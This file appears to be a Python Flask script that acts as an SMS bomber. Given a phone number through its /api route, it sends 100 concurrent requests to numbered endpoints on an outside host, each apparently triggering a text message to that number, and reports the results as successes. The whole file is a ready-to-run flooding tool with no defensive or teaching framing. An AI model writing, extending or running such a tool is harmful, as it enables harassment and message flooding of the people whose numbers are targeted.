import asyncio
import time
import aiohttp
from aiohttp import ClientSession

from flask import Flask, request

app = Flask(__name__)

async def send_request(url: str, session: ClientSession):
    try:
        async with session.get(url, timeout=5) as response:
            result = await response.text()
            return url, " Sms Send Success"
    except Exception as e:
        return url, f"Send to sms fail!"

async def send_all_requests(urls: list):
    my_conn = aiohttp.TCPConnector(limit=500)
    
    async with aiohttp.ClientSession(connector=my_conn) as session:
        tasks = [asyncio.ensure_future(send_request(url=url, session=session)) for url in urls]
        return await asyncio.gather(*tasks, return_exceptions=True)

@app.route('/api')
def golu():
    phn = request.args.get('phone')
    if not phn:
        return {"error": "Please Enter Number!"}
    
    base_url = "http://proxy.delwarcoxit.com/api"
    phone_number = phn
    api_endpoints = [f"{base_url}{i}.php?phone={phone_number}" for i in range(0, 100)]
    
    start = time.time()
    
    # Create a new event loop
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    try:
        results = loop.run_until_complete(send_all_requests(api_endpoints))
    finally:
        loop.close()
    
    end = time.time()

    response_data = []

    for url, status in results:
        api_number = url[len(base_url):-len(".php?phone=" + phone_number)]
        response_data.append(f'api{api_number}: {status}')

    response_data.append(f'Sent {len(api_endpoints)} requests in {end - start}')

    return {"msg": "Sms send request completed", "response_data": response_data}

if __name__ == "__main__":
    app.run(debug=True)
